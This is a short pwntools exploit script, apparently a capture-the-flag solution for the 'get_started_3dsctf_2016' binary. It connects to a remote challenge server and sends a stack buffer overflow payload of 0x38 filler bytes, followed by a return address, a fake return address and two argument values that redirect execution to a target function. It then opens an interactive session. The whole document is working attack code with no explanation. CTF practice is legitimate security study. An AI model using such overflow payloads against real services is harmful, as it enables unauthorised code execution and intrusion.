from pwn import *

#io = process('./get_started_3dsctf_2016')
io = remote('node4.buuoj.cn',28300)
#raw_input()
context.log_level = 'debug'

payload = b'\x61'*0x38 + p32(0x080489A0) + p32(0x0804E6A0) +p32(814536271) + p32(425138641)

#io.recvuntil(b'magica?')
io.sendline(payload)


io.interactive()
